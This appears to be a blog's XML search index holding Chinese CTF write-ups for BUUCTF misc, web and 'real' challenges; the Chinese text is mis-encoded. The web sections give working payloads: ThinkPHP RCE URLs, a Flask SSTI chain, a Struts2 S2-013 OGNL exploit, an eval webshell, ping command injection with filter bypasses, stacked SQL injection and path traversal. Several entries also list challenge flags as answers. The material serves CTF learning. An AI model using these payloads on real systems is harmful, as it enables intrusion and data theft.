<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>buu_misc</title>
    <url>/2023/01/24/buu%E5%90%88%E9%9B%86-buu-misc/</url>
    <content><![CDATA[<p>  buuç¬¬ä¸€é¡µã€‚</p>
 <span id="more"></span>

<h1 id="å¤§ç™½"><a href="#å¤§ç™½" class="headerlink" title="å¤§ç™½"></a>å¤§ç™½</h1><p>010æ‰“å¼€ç¬¬äºŒè¡Œ6ï¼Œ7å³é«˜åº¦</p>
<p>flag{He1lO_d4_ba1}</p>
<h1 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h1><p>é¢˜ç›® ï¼šé»‘å®¢é€šè¿‡wiresharkæŠ“åˆ°ç®¡ç†å‘˜ç™»é™†ç½‘ç«™çš„ä¸€æ®µæµé‡åŒ…ï¼ˆç®¡ç†å‘˜çš„å¯†ç å³æ˜¯ç­”æ¡ˆ) æ³¨æ„ï¼šå¾—åˆ°çš„ flag è¯·åŒ…ä¸Š flag{} æäº¤</p>
<p>æ ¹æ®æç¤ºç›´æ¥è¿‡æ»¤å‡ºPOSTåŒ…</p>
<p>http.request.method&#x3D;&#x3D;POST</p>
<p>flag{ffb7567a1d4f4abdffdb54e022f8facd}</p>
<h1 id="zipä¼ªåŠ å¯†"><a href="#zipä¼ªåŠ å¯†" class="headerlink" title="zipä¼ªåŠ å¯†"></a>zipä¼ªåŠ å¯†</h1><p>æœªåŠ å¯†ï¼š</p>
<p>æ–‡ä»¶å¤´ä¸­çš„å…¨å±€æ–¹å¼ä½æ ‡è®°ä¸º00 00</p>
<p> ç›®å½•ä¸­æºæ–‡ä»¶çš„å…¨å±€æ–¹å¼ä½æ ‡è®°ä¸º00 00</p>
<p>ä¼ªåŠ å¯†ï¼š</p>
<p>æ–‡ä»¶å¤´ä¸­çš„å…¨å±€æ–¹å¼ä½æ ‡è®°ä¸º00 00</p>
<p>ç›®å½•ä¸­æºæ–‡ä»¶çš„å…¨å±€æ–¹å¼ä½æ ‡è®°ä¸º09 00</p>
<p>çœŸåŠ å¯†ï¼š</p>
<p>æ–‡ä»¶å¤´ä¸­çš„å…¨å±€æ–¹å¼ä½æ ‡è®°ä¸º09 00</p>
<p>ç›®å½•ä¸­æºæ–‡ä»¶çš„å…¨å±€æ–¹å¼ä½æ ‡è®°ä¸º09 00</p>
<p><a href="https://blog.csdn.net/xiaozhaidada/article/details/124538768">(6æ¡æ¶ˆæ¯) CTFâ€”â€”zipä¼ªåŠ å¯†_xiaozhaidadaçš„åšå®¢-CSDNåšå®¢</a></p>
<p>flag{Adm1N-B2G-kU-SZIP}</p>
<h1 id="è¢«å—…æ¢çš„æµé‡"><a href="#è¢«å—…æ¢çš„æµé‡" class="headerlink" title="è¢«å—…æ¢çš„æµé‡"></a>è¢«å—…æ¢çš„æµé‡</h1><p>æŸé»‘å®¢æ½œå…¥åˆ°æŸå…¬å¸å†…ç½‘é€šè¿‡å—…æ¢æŠ“å–äº†ä¸€æ®µæ–‡ä»¶ä¼ è¾“çš„æ•°æ®ï¼Œè¯¥æ•°æ®ä¹Ÿè¢«è¯¥å…¬å¸æˆªè·ï¼Œä½ èƒ½å¸®è¯¥å…¬å¸åˆ†æä»–æŠ“å–çš„åˆ°åº•æ˜¯ä»€ä¹ˆæ–‡ä»¶çš„æ•°æ®å—ï¼Ÿ æ³¨æ„ï¼šå¾—åˆ°çš„ flag è¯·åŒ…ä¸Š flag{} æäº¤</p>
<p><a href="https://files.buuoj.cn/files/ff965ff87437e3fda765ba928da94821/efa02e35-ee20-476f-94a2-cadbcef7d076.zip"> efa02e35-ee20-476f-94a2-cadbcef7d076.zip</a></p>
<p>è§£æ³•ä¸€</p>
<p>æ ¹æ®æç¤ºï¼Œæ–‡ä»¶ä¼ è¾“ç›´æ¥æ‰¾POSTçš„åŒ…</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http.request.method==POST</span><br></pre></td></tr></table></figure>

<p>è§£æ³•äºŒ</p>
<p>æŸ¥æ‰¾å­—ç¬¦<strong>flag.</strong></p>
<p>è¿½è¸ªæµtcpæµæ‰“å¼€</p>
<p>flag{da73d88936010da1eeeb36e945ec4b97}</p>
<h1 id="qr"><a href="#qr" class="headerlink" title="qr"></a>qr</h1><p><a href="https://www.online-qr-scanner.com/zh-cn/">åœ¨çº¿äºŒç»´ç æ‰«æå™¨ (online-qr-scanner.com)</a></p>
<p>è§£æ³•äºŒ</p>
<p>å¾®ä¿¡æ‰«ä¸€ä¸‹</p>
<p>flag{878865ce73370a4ce607d21ca01b5e59}</p>
<h2 id="é•œå­é‡Œé¢çš„ä¸–ç•Œ"><a href="#é•œå­é‡Œé¢çš„ä¸–ç•Œ" class="headerlink" title="é•œå­é‡Œé¢çš„ä¸–ç•Œ"></a>é•œå­é‡Œé¢çš„ä¸–ç•Œ</h2><p>flag{st3g0_saurus_wr3cks}</p>
<h2 id="å¦å¤–ä¸€ä¸ªä¸–ç•Œ"><a href="#å¦å¤–ä¸€ä¸ªä¸–ç•Œ" class="headerlink" title="å¦å¤–ä¸€ä¸ªä¸–ç•Œ"></a>å¦å¤–ä¸€ä¸ªä¸–ç•Œ</h2><p>01101011011011110110010101101011011010100011001101110011</p>
<p> åœ¨æ–‡ä»¶æœ€åæ‰¾åˆ°ä¸€ä¸²äºŒè¿›åˆ¶æ•°å­—ï¼Œä»¥8 ä½ä¸ºä¸€ç»„ï¼Œè½¬æ¢ä¸º10è¿›åˆ¶ï¼Œå†å¯¹ç…§ASCIIç è¡¨å¾—å‡ºå­—ç¬¦ã€‚æœ€åä»¥flagæ ¼å¼æäº¤ã€‚flag{koekj3s}</p>
<h2 id="webshellåé—¨"><a href="#webshellåé—¨" class="headerlink" title="webshellåé—¨"></a>webshellåé—¨</h2><p>dç›¾æŸ¥ä¸€ä¸‹å°±å‡ºæ¥äº†ä½†æ˜¯æ–‡ä»¶ä¿®æ”¹è¿‡äº†ï¼Œä½†flagæ²¡æ”¹ï¼Œ</p>
<p>ä½†æ— æ‰€è°“äº†</p>
<p>åé—¨æŸ¥æ€åŒä¸Šé¢˜</p>
<p>flag{6ac45fb83b3bc355c024f5034b947dd3}</p>
<p><a href="https://so.csdn.net/so/search?q=zlib&spm=1001.2101.3001.7020">zlib</a>æ˜¯PNG IDATçš„å¯é€‰å‹ç¼©æ ¼å¼</p>
]]></content>
      <categories>
        <category>misc</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>buu-real1</title>
    <url>/2023/06/19/buu%E5%90%88%E9%9B%86-buu-real1/</url>
    <content><![CDATA[<p>buu realå°½åŠ›å†™</p>
<span id="more"></span>

<h2 id="ThinkPHP-5-Rce"><a href="#ThinkPHP-5-Rce" class="headerlink" title="[ThinkPHP]5-Rce"></a>[ThinkPHP]5-Rce</h2><p>payload:</p>
<p><code>[ V5.0 ç‰ˆæœ¬ç”± [ä¸ƒç‰›äº‘](http://www.qiniu.com/) ç‹¬å®¶èµåŠ©å‘å¸ƒ ]</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://node4.buuoj.cn:28434/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls</span><br></pre></td></tr></table></figure>

<h2 id="Flask-SSTI"><a href="#Flask-SSTI" class="headerlink" title="[Flask]SSTI"></a>[Flask]SSTI</h2><p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;%27%27.__class__.__bases__[0].__subclasses__()[166].__init__.__globals__.__builtins__[%27eval%27](%22__import__(%27os%27).popen(%27env%27).read()%22)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>flagåœ¨ç¯å¢ƒå˜é‡é‡Œ</p>
<h2 id="ThinkPHP-5-0-23-Rce"><a href="#ThinkPHP-5-0-23-Rce" class="headerlink" title="[ThinkPHP]5.0.23-Rce"></a>[ThinkPHP]5.0.23-Rce</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /index.php?s=captcha HTTP/1.1</span><br></pre></td></tr></table></figure>

<p>postå¦‚ä¸‹ï¼Œç”±äºflagåœ¨ç¯å¢ƒå˜é‡é‡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=env</span><br></pre></td></tr></table></figure>

<h2 id="ThinkPHP-2-Rce"><a href="#ThinkPHP-2-Rce" class="headerlink" title="[ThinkPHP]2-Rce"></a>[ThinkPHP]2-Rce</h2><p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?s=/index/index/name/$&#123;@phpinfo()&#125;</span><br></pre></td></tr></table></figure>

<p>æœç´¢flag</p>
<p>æˆ–è€…</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://node4.buuoj.cn:28261/?s=/index/index/name/$&#123;@eval($_POST[1])&#125;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥èšå‰‘è¿æ¥ï¼Œ</p>
<h2 id="struts2-s2-013"><a href="#struts2-s2-013" class="headerlink" title="[struts2]s2-013"></a>[struts2]s2-013</h2><p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/link.action?a=%24%7b(%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c%23a%3d%40java.lang.Runtime%40getRuntime().exec(%27env%27).getInputStream()%2c%23b%3dnew+java.io.InputStreamReader(%23a)%2c%23c%3dnew+java.io.BufferedReader(%23b)%2c%23d%3dnew+char%5b50000%5d%2c%23c.read(%23d)%2c%23out%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23out.println(%23d)%2c%23out.close())%7d</span><br></pre></td></tr></table></figure>



<h2 id="Jupyter-notebook-rce"><a href="#Jupyter-notebook-rce" class="headerlink" title="[Jupyter]notebook-rce"></a>[Jupyter]notebook-rce</h2><p>æ‰“å¼€ç•Œé¢</p>
<p><img src="/2023/06/19/buu%E5%90%88%E9%9B%86-buu-real1/QQ%E6%88%AA%E5%9B%BE20230619221929.png"></p>
<p>æ–°å»ºä¸€ä¸ªç»ˆç«¯ï¼Œç›´æ¥env</p>
<p>æˆ–è€…echo $FLAG</p>
]]></content>
      <categories>
        <category>buu</category>
      </categories>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>buu3</title>
    <url>/2023/06/03/buu%E5%90%88%E9%9B%86-buu3/</url>
    <content><![CDATA[<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">fwrite(STDOUT,&#x27;[+]your function: &#x27;);</span><br><span class="line"></span><br><span class="line">$system=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN));</span><br><span class="line"></span><br><span class="line">fwrite(STDOUT,&#x27;[+]your command: &#x27;);</span><br><span class="line"></span><br><span class="line">$command=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN));</span><br><span class="line"></span><br><span class="line">echo &#x27;[*] (~&#x27;.urlencode(~$system).&#x27;)(~&#x27;.urlencode(~$command).&#x27;);&#x27;;</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹ä¸ºpostä¼ å‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assertï¼ˆeval($_POST[1])ï¼‰</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%DD%8B%9A%8C%8B%DD%A2%D6%D6);</span><br></pre></td></tr></table></figure>

<p>ï¼Œä¸Šèšå‰‘disable_function,æ’ä»¶</p>
<p><img src="/2023/06/03/buu%E5%90%88%E9%9B%86-buu3/QQ%E6%88%AA%E5%9B%BE20230603194104.png"></p>
<p>è¿è¡Œè¿™ä¸ªï¼Œ</p>
<p>åœ¨ç»ˆç«¯è¿è¡Œ&#x2F;readflagå³å¯</p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>buu_web</title>
    <url>/2023/02/01/buu%E5%90%88%E9%9B%86-buu-web/</url>
    <content><![CDATA[<p>   buuç¬¬ä¸€é¡µã€‚</p>
 <span id="more"></span>

<h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="comment">//åˆ¤æ–­$pageæ˜¯å¦å­˜åœ¨äº$whitelistæ•°ç»„ä¸­ï¼Œå­˜åœ¨åˆ™è¿”å›true</span></span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)//ä»<span class="number">0</span>æˆªå–åˆ°ï¼Ÿ</span><br><span class="line">            );<span class="comment">//.&#x27;?&#x27;åœ¨ç»“å°¾è¡¥?</span></span><br><span class="line">            <span class="comment">//mb_strpos()mb_strpos â€” æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½®</span></span><br><span class="line">              <span class="comment">//mb_substr() å‡½æ•°æ ¹æ® start å’Œ length å‚æ•°è¿”å› str ä¸­æŒ‡å®šçš„éƒ¨åˆ†</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="comment">//æˆªå–åæ˜¯å¦å­˜åœ¨åœ¨ç™½åå•</span></span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>]) <span class="comment">//checkFileæ ¡éªŒ</span></span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>â€œ.&#x2F;â€œï¼šä»£è¡¨ç›®å‰æ‰€åœ¨çš„ç›®å½•ã€‚</strong></p>
<p><strong>â€œ . .&#x2F;â€œä»£è¡¨ä¸Šä¸€å±‚ç›®å½•ã€‚</strong></p>
<p><strong>â€œ&#x2F;â€œï¼šä»£è¡¨æ ¹ç›®å½•ã€‚</strong></p>
<p>æ³¨ï¼š ç¡®ä¿urlè§£ç åèƒ½é€šè¿‡ç™½åå•ã€‚æµè§ˆå™¨ä¼šè§£ç ä¸€æ¬¡ï¼Œè€Œ ? ç»è¿‡ä¸€æ¬¡urlencodeç¼–ç ä¸ºï¼š%3fï¼›ä¸¤æ¬¡ä¸ºï¼š%253f</p>
<p>payload:<code>/source.php/?file=hint.php%253f../../../../../ffffllllaaaagggg</code></p>
<p><code> </code>flag{cda6b5c3-dab2-42fb-a21e-6e7280953804}</p>
<h2 id="ACTF2020-æ–°ç”Ÿèµ›-Includeâ€“ä¼ªåè®®"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Includeâ€“ä¼ªåè®®" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Includeâ€“ä¼ªåè®®"></a>[ACTF2020 æ–°ç”Ÿèµ›]Includeâ€“ä¼ªåè®®</h2><p>ä¼ªåè®®</p>
<p>file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</p>
<p>file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<p>flag{bc539291-7afe-46da-9629-52bb02de6ffb}</p>
<h2 id="ACTF2020-æ–°ç”Ÿèµ›-Exec"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Exec" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Exec"></a>[ACTF2020 æ–°ç”Ÿèµ›]Exec</h2><p>127.0.0.1;ls &#x2F;;</p>
<p>127.0.0.1;cat &#x2F;flag;</p>
<p>flag{b48b1925-822a-46b7-8cdc-db7b94b1604e}</p>
<h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>æ‰“å¼€å&#x2F;?ip&#x3D;</p>
<p>getä¼ å‚ip&#x3D;1æ—¶</p>
<p>è¿”å›</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PING 1 (0.0.0.1): 56 data bytes</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PING 2 (0.0.0.2): 56 data bytes</span><br></pre></td></tr></table></figure>

<p>çŒœæµ‹æ˜¯ä¸€ä¸ªè®¡ç®—æœºæŒ‡ä»¤ï¼Œipçš„å€¼ä¸ºipåœ°å€</p>
<p>?ip&#x3D;127.0.0.1;ls</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br><span class="line">flag.php</span><br><span class="line">index.php</span><br></pre></td></tr></table></figure>

<p>cat flag.php</p>
<p>å‘ç°ç©ºæ ¼è¢«è¿‡æ»¤ï¼Œflagï¼Œ* ï¼Ÿè¢«è¿‡æ»¤</p>
<p>?ip&#x3D;127.0.0.1;cat$IFS$1index.php ï¼Œå‘ç°æºç ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span><br><span class="line">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span><br><span class="line">    die(&quot;fxck your symbol!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your space!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your bash!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your flag!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span><br><span class="line">  echo &quot;</span><br><span class="line">&quot;;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>ç»•è¿‡æ–¹æ³•</p>
<ol>
<li>$IFS</li>
<li>${IFS}</li>
<li>$IFS$1 &#x2F;&#x2F;$1æ”¹æˆ$åŠ å…¶ä»–æ•°å­—è²Œä¼¼éƒ½è¡Œ</li>
<li>&lt; </li>
<li>&lt;&gt; </li>
<li>{cat,flag.php}  &#x2F;&#x2F;ç”¨é€—å·å®ç°äº†ç©ºæ ¼åŠŸèƒ½</li>
<li>%20 </li>
<li>%09</li>
</ol>
<p>åªèƒ½ç”¨$IFS$1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat `ls` #æŸ¥çœ‹å½“å‰ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶çš„å†…å®¹ã€‚</span><br><span class="line"></span><br><span class="line">cat *     #æŸ¥çœ‹å½“å‰ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶çš„å†…å®¹ã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;cat$IFS$9`ls`</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹æºä»£ç </p>
<p>flag{4fe89af8-21fb-405b-81f1-bb4510e5d776}</p>
<h2 id="å¼ºç½‘æ¯-2019-éšä¾¿æ³¨"><a href="#å¼ºç½‘æ¯-2019-éšä¾¿æ³¨" class="headerlink" title="[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨"></a>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</h2><h3 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å æ³¨å…¥</h3><p>æµ‹è¯• 1â€™ or 1&#x3D;1 # ,åˆæ­¥åˆ¤å®šå­˜åœ¨SQLæ³¨å…¥ã€‚</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1 #</span></span><br></pre></td></tr></table></figure>

<p>å†æµ‹è¯•å­—æ®µæ•°ï¼Œåˆ°3æ—¶æŠ¥é”™ï¼Œè¯´æ˜å­—æ®µæ•°ä¸º2.</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; order by 1 # </span></span><br></pre></td></tr></table></figure>

<p>æ¥ç€å°è¯•unionæ³¨å…¥,å›æ˜¾äº†è¿‡æ»¤çš„å…³é”®å­—ã€‚</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2#</span></span><br></pre></td></tr></table></figure>

<p>å †å æ³¨å…¥â€<br>åŸç†ï¼Œå°±æ˜¯é€šè¿‡ ; å·æ³¨å…¥å¤šæ¡SQLè¯­å¥</p>
<p>å…ˆé€šè¿‡show databasesçˆ†å‡ºæ•°æ®åº“ã€‚</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27;; show databases; #</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰ä¸¤ä¸ªè¡¨ï¼Œæˆ‘ä»¬å…ˆå°è¯•çˆ†wordsè¡¨çš„å†…å®¹ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; show columns from words; #</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åæŠ¥è¡¨ 1919810931114514 çš„å†…å®¹ã€‚</p>
<p><strong>è¡¨åä¸ºæ•°å­—æ—¶ï¼Œè¦ç”¨åå¼•å·åŒ…èµ·æ¥æŸ¥è¯¢ã€‚</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27;; show columns from `1919810931114514 `; #</span></span><br></pre></td></tr></table></figure>

<p>1ï¼Œé€šè¿‡ rename å…ˆæŠŠ words è¡¨æ”¹åä¸ºå…¶ä»–çš„è¡¨åã€‚</p>
<p>2ï¼ŒæŠŠ 1919810931114514 è¡¨çš„åå­—æ”¹ä¸º words ã€‚</p>
<p>3 ï¼Œç»™æ–° words è¡¨æ·»åŠ æ–°çš„åˆ—å id ã€‚</p>
<p>4ï¼Œå°† flag æ”¹åä¸º data ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#</span><br></pre></td></tr></table></figure>

<p>[ BUUCTF[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨ çš„ä¸‰ç§è§£æ³•_å¤©é—®_Herbert555çš„åšå®¢-CSDNåšå®¢_[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨](<a 